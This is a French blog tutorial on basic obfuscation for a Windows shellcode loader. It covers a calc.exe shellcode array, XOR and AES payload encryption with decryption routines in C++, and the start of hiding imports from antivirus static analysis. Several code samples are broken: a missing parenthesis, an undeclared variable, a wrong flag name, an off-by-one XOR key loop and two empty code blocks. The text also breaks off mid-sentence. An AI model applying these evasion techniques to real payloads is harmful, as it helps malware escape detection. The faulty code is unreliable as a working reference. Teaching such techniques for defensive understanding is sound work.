# Les bases de l'obfuscation

Nous avons créé ensemble dans le précédent post un exécutable utilisant l'API Windows pour exécuter un shellcode, super.

Le petit souci, c'est que les fonctions importées apparaitront directement dans la table des imports (pour plus d'informations, se référer à la troisième entrée de ma série d'article sur le format de fichier PE). Et les produits antiviraux ne sont pas bêtes ; pour ce qui touche à l'analyse statique, un exécutable qui importe le quatuor de fonctions utilisées dans le précédent post et qui inclut son payload "tel quel" va faire s'illuminer n'importe quelle console de SOC comme un sapin de noël. Dans ce post, nous allons donc visualiser les concepts basiques qu'un acteur malicieux pourrait utiliser afin d'obfusquer les signes les plus évidents de la dangerosité de son programme.

>Avertissement ; j'écris "concepts basiques" volontairement. Le but étant de montrer ici qu'il est possible d'obfusquer une fonction pour éviter qu'elle apparaisse lors d'une analyse statique, et de chiffrer un potentiel payload. En réalité, ça n'est pas avec un coup de moulinette XOR/AES et un simple appel au duo GetProcAddress/GetModuleHandle que vous allez contourner Windows Defender en l'an 2022. Mais en tant qu'introduction ? Ca fera l'affaire. Plus tard, j'aborderai peut-être des concepts plus avancés et surtout modernes, comme l'API Hashing utilisé par des acteurs malicieux de type APT, par exemple.

## Inclure un payload chiffré

Afin d'éviter qu'une solution anti-virale détecte statiquement notre payload non obfusqué, nous pouvons au préalable le chiffrer, l'inclure dans notre programme, puis le déchiffrer lors de l'exécution de notre programme. J'utiliserai deux algorithmes basiques, XOR et AES, à des fins de démonstration.

Pour commencer, remplacons les simples nullbytes de notre payload avec un magnifique shellcode faisant pop calc.exe, à des fins de démonstrations.

```assembly
0xeb, 0x44, 0x5b, 0x33, 0xd2, 0x88, 0x53, 0x0b,
0x53, 0xb8, 0x80, 0x22, 0xbf, 0x74, 0xff, 0xd0,
0xeb, 0x45, 0x5b, 0x33, 0xd2, 0x88, 0x53, 0x0d,
0x53, 0x50, 0xb8, 0xa0, 0x05, 0xbf, 0x74, 0xff,
0xd0, 0xeb, 0x47, 0x5b, 0x33, 0xd2, 0x88, 0x53,
0x08, 0xeb, 0x4d, 0x59, 0x33, 0xd2, 0x88, 0x51,
0x04, 0x33, 0xd2, 0x6a, 0x05, 0x52, 0x52, 0x53,
0x51, 0x52, 0xff, 0xd0, 0x33, 0xd2, 0x52, 0xb8,
0x20, 0x4f, 0xbf, 0x74, 0xff, 0xd0, 0xe8, 0xb7,
0xff, 0xff, 0xff, 0x53, 0x68, 0x65, 0x6c, 0x6c,
0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x58, 0xe8,
0xb6, 0xff, 0xff, 0xff, 0x53, 0x68, 0x65, 0x6c,
0x6c, 0x45, 0x78, 0x65, 0x63, 0x75, 0x74, 0x65,
0x41, 0x58, 0xe8, 0xb4, 0xff, 0xff, 0xff, 0x63,
0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x58,
0xe8, 0xae, 0xff, 0xff, 0xff, 0x6f, 0x70, 0x65,
0x6e, 0x58
```

Long et et illisible par tout être humain normalement constitué (mes félicitations si vous arrivez à déchiffrer des opcodes x64 de visu, passez me voir à la prochaine édition de LeHack pour une bière gratuite), mais parfaitement fonctionnel. 

### XOR

La première étape consiste pour commencer à chiffrer ledit shellcode. Commencons par le XOR-er en dehors de ce programme, en utilisant ce petit programme en python (écrit par "Renzo", l'instructeur du cours Sektor7 mentionné dans l'introduction de cette série d'articles), qui se charge de chiffrer notre payload en utilisant la chaîne de caractères "korielzeth" :

```python
import sys

KEY = "korielzeth"

def xor(data, key):
	l = len(key)
	output_str = ""

	for i in range(len(data)):
		current = data[i]
		current_key = key[i%len(key)]
		output_str += chr(ord(current) ^ ord(current_key))
	
	return output_str

def printC(ciphertext):
	print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')

try:
    plaintext = open(sys.argv[1], "r").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = xor(plaintext, KEY)

printC(ciphertext)
```

Une fois notre shellcode original passé à la moulinette de ce programme, celui-ci ressemblera à :

```assembly

```

La fonction visant à déchiffrer le payload une fois l'exécution commencée, plutôt simple, ressemblera à ça :


```cpp
void xordecrypt(LPWSTR payload, size_t payloadlen, LPWSTR clé, size_t clélen) {

	int j = 0;

	for (int i = 0; i < payloadlen; i++) {
		if (j == clélen - 1) j = 0;
		payload[i] = payload[i] ^ clé[j];
		j++;
	}

}
```

Où payloadlen et clélen correspondent à la longueur (via l'utilisation de sizeof() ) de notre payload et de notre clé.

### AES

Même logique que précédemment. On prend notre payload original, le chiffrons (ici avec l'algorithme AES) avant de créer une fonction se chargeant de le déchiffrer lors de l'exécution du programme.

Voilà à quoi ressemble le programme se chargeant du chiffrement :

```python
```



La fonction visant à déchiffrer le payload une fois l'exécution commencée, quand à elle, ressemble à ça. 

>Si vous êtes curieux concernant l'utilisation des fonctions cryptographiques de l'API Windows, vous pouvez aller jeter un oeil au deuxième post concernant mon journal de dévelopement d'une PoC de ransomware

```cpp
int AESdecrypt(char* payload, int payloadlen, char* key, size_t keylen) {
	
	HCRYPTPROV hProv;
	HCRYPTKEY hKey;
	HCRYPTHASH hHash;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFY_CONTEXT) {

		return -1;

	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {


		return -1;

	}

	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {

		return -1;
	}

	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {

		return -1;
	}

	if (!CryptDecrypt(hKey,0,0,0,payload,&payload_len)) {


		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}

}
```

Les noms des fonctions sont somme toutes explicites : une handle est crée vers un contexte cryptographique, puis un hash SHA256 est généré et une Clé (objet Windows) est dérivée en se basant sur ledit hash et la clé (une chaîne de caractère aléatoire générée lors de l'encryption de ce programme). Le payload est ensuite déchiffré en utilisant cette Clé, puis les différentes handles vers les objects créés par la fonction (contexte, hash,et Clé) sont ensuite supprimés.

## L'obfuscation de nos appels de fonction

Comme mentionné dans l'introduction de cet article, le premier indicateur de dangerosité d'un exécutable, analysé en premier par les divers solutions anti-virales, qu'elles soient inclues dans les systèmes d'exploitation, est la table des imports dudit exécutable.

Prenons comme exemple l'exécutable généré dans la section précédente, et analysons sa table d'imports avec l'utilitaire PEBear :



 Il existe un moyen somme toute basique